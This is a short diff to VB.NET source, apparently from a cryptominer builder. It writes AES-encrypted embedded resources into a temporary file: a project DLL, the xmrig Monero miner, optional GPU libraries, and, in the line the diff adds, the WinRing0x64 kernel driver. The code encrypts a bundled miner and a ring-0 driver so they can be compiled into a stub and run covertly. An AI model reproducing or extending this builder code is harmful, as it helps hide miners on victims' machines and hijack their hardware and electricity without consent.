@@ -35,6 +35,7 @@ Public Class Codedom
             Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
                 R.AddResource(F.Resources_dll, AES_Encryptor(My.Resources.Project1))
                 R.AddResource(F.Resources_xmr, AES_Encryptor(My.Resources.xmrig))
+                R.AddResource(F.Resources_winring, AES_Encryptor(My.Resources.WinRing0x64))
                 If (F.toggleEnableGPU.Checked) Then
                     R.AddResource(F.Resources_libs, AES_Encryptor(My.Resources.libs))
                 End If
